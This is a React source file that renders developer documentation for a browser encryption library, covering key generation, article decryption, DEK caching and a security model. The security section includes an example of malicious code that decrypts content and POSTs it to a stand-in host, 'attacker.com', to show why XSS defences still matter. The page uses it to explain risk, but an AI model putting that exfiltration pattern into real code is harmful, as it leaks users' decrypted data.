import { CodeBlock } from "@/components/CodeBlock";

export default function ClientPage() {
  return (
    <main className="content-page">
      <h1>Client Integration</h1>
      <p>
        The Capsule client is a lightweight browser library that handles key
        management and content decryption using the Web Crypto API.
      </p>

      <h2>Installation</h2>
      <CodeBlock language="bash">{`npm install @sesamy/capsule`}</CodeBlock>

      <h2>Basic Usage</h2>
      <CodeBlock>{`import { CapsuleClient } from '@sesamy/capsule';

// Initialize client
const client = new CapsuleClient({
  keyId: 'user-keys',
  keySize: 2048, // or 4096
});

// Check if keys exist, generate if needed
const hasKeys = await client.hasKeyPair();
if (!hasKeys) {
  await client.generateKeyPair();
}

// Get public key to send to server
const publicKey = await client.getPublicKey(); // Base64 SPKI

// Decrypt content
const decrypted = await client.decryptArticle({
  encryptedContent: 'base64...',
  iv: 'base64...',
  encryptedDek: 'base64...'
});`}</CodeBlock>

      <h2>API Reference</h2>

      <h3>Constructor Options</h3>
      <CodeBlock>{`interface CapsuleClientOptions {
  keySize?: 2048 | 4096;        // RSA key size (default: 2048)
  dbName?: string;              // IndexedDB database name
  storeName?: string;           // IndexedDB store name
  keyId?: string;               // Key identifier (default: 'default')
}`}</CodeBlock>

      <h3>Methods</h3>

      <h4>generateKeyPair()</h4>
      <p>Generates a new RSA-OAEP key pair and stores it in IndexedDB.</p>
      <CodeBlock>{`const publicKeyB64 = await client.generateKeyPair();
// Returns: Base64-encoded SPKI public key`}</CodeBlock>

      <h4>hasKeyPair()</h4>
      <p>Checks if a key pair exists in storage.</p>
      <CodeBlock>{`const exists = await client.hasKeyPair();
// Returns: boolean`}</CodeBlock>

      <h4>getPublicKey()</h4>
      <p>Retrieves the stored public key in Base64 SPKI format.</p>
      <CodeBlock>{`const publicKey = await client.getPublicKey();
// Returns: Base64-encoded SPKI public key`}</CodeBlock>

      <h4>decryptArticle(payload)</h4>
      <p>Decrypts an encrypted article payload.</p>
      <CodeBlock>{`const content = await client.decryptArticle({
  encryptedContent: 'base64-ciphertext',
  iv: 'base64-iv',
  encryptedDek: 'base64-wrapped-dek'
});
// Returns: Decrypted content as string`}</CodeBlock>

      <h4>decryptContent(payload)</h4>
      <p>Decrypts content and returns raw ArrayBuffer.</p>
      <CodeBlock>{`const buffer = await client.decryptContent(payload);
// Returns: ArrayBuffer`}</CodeBlock>

      <h4>clearKeys()</h4>
      <p>Deletes all stored keys from IndexedDB.</p>
      <CodeBlock>{`await client.clearKeys();`}</CodeBlock>

      <h2>React Integration</h2>
      <CodeBlock>{`import { useState, useEffect } from 'react';
import { CapsuleClient } from '@sesamy/capsule';

export function useCapsule() {
  const [client, setClient] = useState(null);
  const [isReady, setIsReady] = useState(false);

  useEffect(() => {
    async function init() {
      const capsule = new CapsuleClient({ keyId: 'demo-key' });
      
      const hasKeys = await capsule.hasKeyPair();
      if (!hasKeys) {
        await capsule.generateKeyPair();
      }
      
      setClient(capsule);
      setIsReady(true);
    }
    
    init();
  }, []);

  return { client, isReady };
}

// Usage
function Article({ encryptedData }) {
  const { client, isReady } = useCapsule();
  const [content, setContent] = useState(null);

  const unlock = async () => {
    const publicKey = await client.getPublicKey();
    
    // Get wrapped DEK from server
    const res = await fetch('/api/unlock', {
      method: 'POST',
      body: JSON.stringify({ tier: 'premium', publicKey })
    });
    const { encryptedDek } = await res.json();
    
    // Decrypt
    const decrypted = await client.decryptArticle({
      ...encryptedData,
      encryptedDek
    });
    
    setContent(decrypted);
  };

  return (
    <div>
      {content ? (
        <div>{content}</div>
      ) : (
        <button onClick={unlock} disabled={!isReady}>
          Unlock
        </button>
      )}
    </div>
  );
}`}</CodeBlock>

      <h2>Advanced: DEK Caching</h2>
      <p>
        For subscription-based models, cache unwrapped DEKs to avoid repeated
        server requests:
      </p>
      <CodeBlock>{`const dekCache = new Map(); // tier → CryptoKey

async function unlockTier(tier, client) {
  // Check cache first
  if (dekCache.has(tier)) {
    return dekCache.get(tier);
  }
  
  // Get public key
  const publicKey = await client.getPublicKey();
  
  // Request wrapped DEK from server
  const res = await fetch('/api/unlock', {
    method: 'POST',
    body: JSON.stringify({ tier, publicKey })
  });
  const { encryptedDek } = await res.json();
  
  // Unwrap DEK
  const dek = await crypto.subtle.unwrapKey(
    'raw',
    base64ToArrayBuffer(encryptedDek),
    client.privateKey, // Access via client internals
    { name: 'RSA-OAEP' },
    { name: 'AES-GCM', length: 256 },
    false,
    ['decrypt']
  );
  
  // Cache for session
  dekCache.set(tier, dek);
  return dek;
}`}</CodeBlock>

      <h2>Security Model</h2>
      
      <h3>Private Key Protection: The Core Guarantee</h3>
      <p>
        The Capsule client's security foundation is that <strong>the private key cannot be 
        extracted from the browser</strong>, even by the user or malicious JavaScript code.
      </p>

      <h4>How Non-Extractable Keys Work</h4>
      <p>
        When generating a key pair, the private key is stored with{" "}
        <code>extractable: false</code>:
      </p>
      <CodeBlock>{`const privateKey = await crypto.subtle.importKey(
  'jwk',
  privateKeyJwk,
  { name: 'RSA-OAEP', hash: 'SHA-256' },
  false,  // NOT extractable - enforced by browser engine
  ['unwrapKey']
);`}</CodeBlock>

      <p>This means:</p>
      <ul>
        <li>✅ The key can be <strong>used</strong> for unwrapping DEKs</li>
        <li>❌ The key cannot be <strong>exported</strong> in any format (JWK, PKCS8, raw bytes)</li>
        <li>❌ The key cannot be <strong>copied</strong> to another device or browser</li>
        <li>❌ The key cannot be <strong>downloaded</strong> or sent to a server</li>
      </ul>

      <h4>What About IndexedDB Access?</h4>
      <p>
        Users and JavaScript code <strong>can access IndexedDB</strong> through DevTools or browser APIs:
      </p>
      <CodeBlock>{`// You CAN retrieve the key object
const db = await indexedDB.open('capsule-keys');
const keyPair = await db.get('keypair', 'default');
console.log(keyPair.privateKey); 
// Output: CryptoKey {type: "private", extractable: false, ...}

// But you CANNOT export the key material
await crypto.subtle.exportKey('jwk', keyPair.privateKey);
// ❌ Error: "key is not extractable"

await crypto.subtle.exportKey('pkcs8', keyPair.privateKey);
// ❌ Error: "key is not extractable"

// Even this doesn't help
JSON.stringify(keyPair.privateKey);
// Returns: "{}" (empty object)

const blob = new Blob([keyPair.privateKey]);
// Creates: "[object CryptoKey]" (useless string)`}</CodeBlock>

      <p>
        The <code>CryptoKey</code> object in IndexedDB is just a <strong>handle</strong> or{" "}
        <strong>reference</strong> to the actual key material, which lives in the browser's
        secure crypto subsystem. Think of it like a key to a safe deposit box that only works
        inside the bank - you can use it there, but you can't take the contents home.
      </p>

      <h4>Attack Vector Analysis</h4>
      <table style={{ width: '100%', borderCollapse: 'collapse', marginTop: '1rem' }}>
        <thead>
          <tr>
            <th style={{ textAlign: 'left', padding: '0.5rem', borderBottom: '1px solid #ddd' }}>
              Attack Type
            </th>
            <th style={{ textAlign: 'left', padding: '0.5rem', borderBottom: '1px solid #ddd' }}>
              Can Extract Key?
            </th>
            <th style={{ textAlign: 'left', padding: '0.5rem', borderBottom: '1px solid #ddd' }}>
              Notes
            </th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Server compromise</td>
            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>❌ No</td>
            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Key never sent to server</td>
          </tr>
          <tr>
            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Network interception</td>
            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>❌ No</td>
            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Key never transmitted</td>
          </tr>
          <tr>
            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>XSS / malicious JS</td>
            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>❌ No</td>
            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Can use key, cannot export it</td>
          </tr>
          <tr>
            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Browser DevTools</td>
            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>❌ No</td>
            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Can see object, not bytes</td>
          </tr>
          <tr>
            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Database breach</td>
            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>❌ No</td>
            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>No server-side key storage</td>
          </tr>
          <tr>
            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>User manual export</td>
            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>❌ No</td>
            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Browser prevents all export methods</td>
          </tr>
        </tbody>
      </table>

      <p style={{ marginTop: '1rem' }}>
        The <strong>only</strong> attack that works is using the key for its intended purpose:
      </p>
      <CodeBlock>{`// Malicious code CAN do this:
const decryptedContent = await client.decryptArticle(payload);
await fetch('https://attacker.com', { 
  method: 'POST', 
  body: decryptedContent  // Send decrypted content (not the key!)
});`}</CodeBlock>

      <p>
        This is why <strong>XSS protection</strong> (Content Security Policy, input sanitization)
        remains critical - not to protect the key itself, but to prevent unauthorized{" "}
        <strong>use</strong> of the key.
      </p>

      <h3>Additional Security Layers</h3>
      <ul>
        <li><strong>DEKs in Memory Only</strong>: Unwrapped DEKs are cached in JavaScript memory 
          (not persisted) and lost on page refresh</li>
        <li><strong>AES-GCM Authentication</strong>: 128-bit auth tags prevent tampering with 
          encrypted content</li>
        <li><strong>Web Crypto API</strong>: Uses hardware-accelerated cryptography when available 
          (TPM, Secure Enclave)</li>
        <li><strong>Secure Context Requirement</strong>: Web Crypto API only works over HTTPS or localhost</li>
        <li><strong>Origin Isolation</strong>: IndexedDB is bound to the origin - other websites 
          cannot access your keys</li>
      </ul>

      <h3>What This Means for Your Application</h3>
      <ul>
        <li>✅ <strong>Server compromise cannot leak user keys</strong> - They're not on the server</li>
        <li>✅ <strong>Database breach cannot decrypt content</strong> - Private keys are client-side only</li>
        <li>✅ <strong>Network eavesdropping is ineffective</strong> - Only wrapped DEKs are transmitted</li>
        <li>✅ <strong>Users cannot accidentally export their keys</strong> - Browser prevents it</li>
        <li>✅ <strong>True end-to-end encryption</strong> - Only the user's browser can decrypt</li>
      </ul>

      <h3>Limitations and Trade-offs</h3>
      <ul>
        <li>⚠️ <strong>Key loss means data loss</strong>: If a user clears browser data or switches 
          devices, they lose access</li>
        <li>⚠️ <strong>No cross-device sync</strong>: Keys are tied to a single browser profile</li>
        <li>⚠️ <strong>XSS can still abuse keys</strong>: Malicious code can decrypt content (though 
          not steal keys)</li>
      </ul>

      <p>Consider implementing:</p>
      <ul>
        <li>Server-side encrypted key backup (wrapped with user password)</li>
        <li>Multi-device key synchronization (using secure key exchange protocols)</li>
        <li>Content Security Policy (CSP) to prevent XSS attacks</li>
      </ul>

      <h2>Browser Compatibility</h2>
      <p>Capsule requires the Web Crypto API, which is available in:</p>
      <ul>
        <li>✅ Chrome 37+</li>
        <li>✅ Firefox 34+</li>
        <li>✅ Safari 11+</li>
        <li>✅ Edge 79+</li>
      </ul>
      <p>
        Note: Web Crypto API is only available in secure contexts (HTTPS or
        localhost).
      </p>
    </main>
  );
}
